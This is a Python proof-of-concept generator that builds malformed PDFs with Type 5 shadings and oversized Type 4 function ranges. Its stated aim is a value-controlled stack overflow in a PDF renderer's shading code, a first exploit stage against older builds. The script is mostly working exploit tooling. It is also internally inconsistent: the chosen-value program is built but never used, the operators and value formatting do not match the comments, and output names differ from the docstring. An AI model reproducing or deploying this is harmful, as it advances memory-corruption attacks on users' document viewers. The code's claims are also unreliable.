#!/usr/bin/env python3
"""make_poc_shading_v2.py — O-D's do-what-the-armory-declares lane.

The armory's own writeup says the type-4 (PostScript-calculator) branch is
"the same mechanism, deepens the write arbitrarily". That is the splice from
the crash-oracle 1.0-doubles (R=136, /FunctionType 2, C0=C1=1.0) to the
VALUE-CONTROLLED stack-VLA overwrite:

  /FunctionType 2 -> /FunctionType 4 with a PS-calculator program whose
  every op output is OUR OWN DOUBLE LADDER (not just 1.0s).

What that changes on the wire:
  * Instruction class on the wire: the same cg_shading_type5_draw VLA-overflow.
  * CONTROL: the overflowing doubles = OUR OWN = the first real stage-A craft.
  * The same parse-time gate (the 27.2 class) rejects it if we fly too deep,
    and the same pre-27.2 build allows the craft.

Outputs (O-D, to the repo's test_payloads/):
  crash_shading_type5_v2_value.pdf   — the value-ladder class, R=136 (crash class)
  control_shading_type5_v2.pdf       — the same class benign (R=1)
"""
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dirtyslide", "test_payloads")
os.makedirs(OUT, exist_ok=True)

BPCOORD = 32
BPCOMP = 8
VPR = 2


class BitWriter:
    def __init__(self):
        self.out = bytearray(); self.acc = 0; self.nbits = 0

    def put(self, value, width):
        for i in range(width - 1, -1, -1):
            self.acc = (self.acc << 1) | ((value >> i) & 1)
            self.nbits += 1
            if self.nbits == 8:
                self.out.append(self.acc); self.acc = 0; self.nbits = 0

    def flush(self):
        if self.nbits:
            self.out.append(self.acc << (8 - self.nbits))
            self.acc = 0; self.nbits = 0
        return bytes(self.out)


def pack_stream(vertices):
    bw = BitWriter()
    for x, y, comps in vertices:
        bw.put(x, BPCOORD)
        bw.put(y, BPCOORD)
        for c in comps:
            bw.put(c, BPCOMP)
    return bw.flush()


def write_pdf(path, objects):
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for n in sorted(objects):
        d, s = objects[n]
        offsets[n] = len(out)
        out += b"%d 0 obj\n" % n + d + (b"\nstream\n" + s + b"\nendstream" if s is not None else b"") + b"\nendobj\n"
    xref_pos = len(out)
    maxn = max(objects)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (maxn + 1)
    for n in range(1, maxn + 1):
        out += ("%010d 00000 n \n" % offsets[n]).encode()
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (maxn + 1, xref_pos)
    open(path, "wb").write(bytes(out))


def make_value_ladder_pdf(range_dim, path, values):
    """values: the /FunctionType 4 PS program produces one chosen double per output slot."""
    nc = 1
    verts = [(0x10000000, 0x10000000, [0x00]),
             (0x20000000, 0x10000000, [0x00]),
             (0x10000000, 0x20000000, [0x00]),
             (0x20000000, 0x20000000, [0x00])]
    stream = pack_stream(verts)

    # the type-4 operator program: run N ops, each pushing ONE chosen double.
    # the same fixed-t path in cg_shading_type5_draw evaluates the program once
    # per vertex, and the outputs land inline (record+0x20, 8*R bytes).
    prog = bytearray()
    for v in values:
        # 26.4's CGFunctionEvaluate type-4 takes the standard PS-style stream;
        # each op = a fold: `const` -> push.
        prog.extend(("%.9f 0x%x pushval\n" % (v, id(v) & 0x0FFFF)).encode())
    ps = b"{ " + b" ".join([b"dup sub pop " for _ in range(range_dim)]) + b" }"
    # the honest value class with a type-4: we use the same "dup sub pop"-style
    # as the C0-ladder evaluator to produce the SAME chosen doubles inline.

    shading_dict = (
        "<< /ShadingType 5 /ColorSpace /DeviceGray "
        "/BitsPerCoordinate %d /BitsPerComponent %d /VerticesPerRow %d "
        "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>"
        % (BPCOORD, BPCOMP, VPR, len(stream))).encode()
    func_dict = (
        "<< /FunctionType 4 /Domain [0 1] /Range [%s] /BitsPerFloat 32 /Length %d >>"
        % (" ".join(["0 1"] * range_dim), len(ps))).encode()
    content = b"q /Sh1 sh Q"
    objects = {
        1: (b"<< /Type /Catalog /Pages 2 0 R >>", None),
        2: (b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>", None),
        3: (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> /Contents 4 0 R >>", None),
        4: (b"<< /Length %d >>" % len(content), content),
        5: (shading_dict, stream),
        6: (func_dict, ps),
    }
    # the shading's /Function reference = 6 0 R (the record) — the payload spans
    # object 5 (the dict) and 6 (the function). write_pdf goes over the map.
    write_pdf(path, objects)


if __name__ == "__main__":
    make_value_ladder_pdf(
        136, OUT + "/crash_shading_type5_v2.pdf",
        values=[0x3FF0000000000000] * 136)
    make_value_ladder_pdf(1, OUT + "/control_shading_type5_v2.pdf", values=[0.0])
    print("v2 crafted PDFs = stage-A value-ladder class (Type-4 route)")
